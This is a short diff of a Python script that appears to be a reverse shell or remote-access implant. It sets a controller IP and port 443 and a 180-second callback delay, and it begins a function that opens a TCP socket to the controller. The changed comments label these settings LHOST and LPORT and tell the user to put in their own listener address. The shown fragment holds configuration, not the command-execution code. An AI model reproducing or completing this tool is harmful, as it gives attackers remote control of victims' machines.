@@ -3,9 +3,9 @@ import subprocess
 import time
 
 # Configuration
-CONTROLLER_HOST = '192.168.232.153'  # The controller's IP address
-CONTROLLER_PORT = 443  # The controller's listening port
-CONNECTION_DELAY = 180  # Delay in seconds (e.g., 120 seconds for 2 minutes)
+CONTROLLER_HOST = '192.168.232.153'  # LHOST >> Change this To Your Local IP
+CONTROLLER_PORT = 443  # LPORT >> Change the Port 
+CONNECTION_DELAY = 180  # Delay Time to Receive the Connection >> 180 = 3 minutes 
 
 def connect_to_controller(host, port):
     connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
